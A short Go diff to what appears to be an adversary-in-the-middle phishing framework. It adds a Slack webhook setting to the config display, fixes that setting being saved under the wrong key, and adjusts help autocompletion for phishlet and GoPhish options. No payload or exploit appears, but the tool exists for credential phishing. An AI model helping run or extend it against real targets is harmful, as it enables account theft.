@@ -192,8 +192,8 @@ func (t *Terminal) handleConfig(args []string) error {
 			gophishInsecure = "true"
 		}
 
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "kb_webhook_url", "gophish admin_url", "gophish api_key", "gophish insecure"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.kbWebhookUrl, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure}
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "kb_webhook_url", "slack_webhook_url", "gophish admin_url", "gophish api_key", "gophish insecure"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.kbWebhookUrl, t.cfg.slackWebhookUrl, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -238,7 +238,7 @@ func (t *Terminal) handleConfig(args []string) error {
 		case "slack_webhook_url":
 			t.cfg.slackWebhookUrl = args[1]
 			log.Info("Slack webhook URL set to: %s", args[1])
-			t.cfg.cfg.Set(CFG_KB_WEBHOOK_URL, args[1])
+			t.cfg.cfg.Set(CFG_SLACK_WEBHOOK_URL, args[1]) // <-- Fixed
 			err := t.cfg.cfg.WriteConfig()
 			if err != nil {
 				log.Error("Failed to save config: %v", err)
@@ -1183,7 +1183,8 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")),
 			readline.PcItem("unauth_url"),
 			readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
-			readline.PcItem("webhook", readline.PcItem("kb_webhook_url"), readline.PcItem("slack_webhook_url")),
+			readline.PcItem("kb_webhook_url"),
+			readline.PcItem("slack_webhook_url"),
 			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"))))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
 	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
